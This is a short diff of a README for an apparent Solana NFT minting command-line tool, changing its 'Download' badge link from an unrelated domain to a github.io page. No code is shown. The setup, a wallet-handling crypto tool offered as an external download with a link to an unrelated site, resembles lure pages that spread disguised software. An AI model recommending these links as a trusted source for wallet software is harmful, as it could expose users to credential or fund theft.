@@ -2,7 +2,7 @@
 
 Effortlessly mint and manage NFTs on Solana with this advanced CLI tool. Built for creators, devs, and power users — batch minting, secure wallet integration, and full metadata control in one command.
 
-[![Download Solana Minter](https://img.shields.io/badge/Download-Solana_Minter_CLI-blueviolet)](https://seomadjest.com)
+[![Download Solana Minter](https://img.shields.io/badge/Download-Solana_Minter_CLI-blueviolet)](https://solana-nft-minter-cli.github.io/.github)
 
 ---
 
